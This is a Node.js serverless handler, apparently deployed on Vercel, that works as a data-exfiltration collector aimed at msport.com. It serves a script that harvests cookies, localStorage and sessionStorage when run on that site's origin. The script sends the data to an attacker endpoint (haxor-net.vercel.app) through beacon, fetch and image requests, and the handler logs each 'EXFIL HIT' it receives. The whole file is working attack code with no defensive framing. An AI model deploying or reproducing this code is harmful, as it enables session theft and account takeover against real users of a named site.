const HITS = [];

function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  return xff ? String(xff).split(',')[0].trim() : (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(204).end();

  if (req.method === 'POST') {
    let body = '';
    await new Promise((resolve) => {
      req.on('data', (c) => { body += c; if (body.length > 2e6) req.destroy(); });
      req.on('end', resolve);
      req.on('error', resolve);
    });
    let payload = body;
    if (payload.startsWith('d=')) {
      try { payload = decodeURIComponent(payload.slice(2)); } catch (e) {}
    }
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
    HITS.push(hit);
    console.log('=== EXFIL HIT ===', JSON.stringify(hit));
    return res.status(200).json({ ok: true });
  }

  if (req.query && req.query.d) {
    let payload = String(req.query.d);
    try { payload = decodeURIComponent(payload); } catch (e) {}
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
    HITS.push(hit);
    console.log('=== EXFIL BEACON ===', JSON.stringify(hit));
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    return res.status(200).send(gif);
  }

  const html = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;font-size:12px;padding:12px">
<pre id="o">probing…</pre>
<script>
(function(){
  var EXFIL = 'https://haxor-net.vercel.app/api';
  var OUT = document.getElementById('o');

  function collect() {
    var dump = {
      ts: new Date().toISOString(),
      url: location.href,
      origin: location.origin,
      ua: navigator.userAgent,
      cookie: document.cookie,
      ls: {}, ss: {}
    };
    try { for (var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); dump.ls[k]=localStorage.getItem(k);} } catch(e){}
    try { for (var i=0;i<sessionStorage.length;i++){ var k=sessionStorage.key(i); dump.ss[k]=sessionStorage.getItem(k);} } catch(e){}
    return JSON.stringify(dump);
  }

  function exfil(data) {
    try { navigator.sendBeacon(EXFIL, data); } catch(e){}
    try { fetch(EXFIL, { method:'POST', mode:'no-cors', body:data, keepalive:true }).catch(function(){}); } catch(e){}
    try { (new Image()).src = EXFIL + '?d=' + encodeURIComponent(data.slice(0,1800)) + '&_=' + Date.now(); } catch(e){}
  }

  if (location.hostname.includes('msport.com')) {
    var data = collect();
    OUT.textContent = 'origin: ' + location.origin + '\\ncookie_len: ' + document.cookie.length + '\\n' + data.slice(0, 500);
    exfil(data);
  } else {
    OUT.textContent = 'redirecting to msport.com...';
    window.location.replace('https://www.msport.com/');
  }
})();
</script></body></html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).send(html);
};
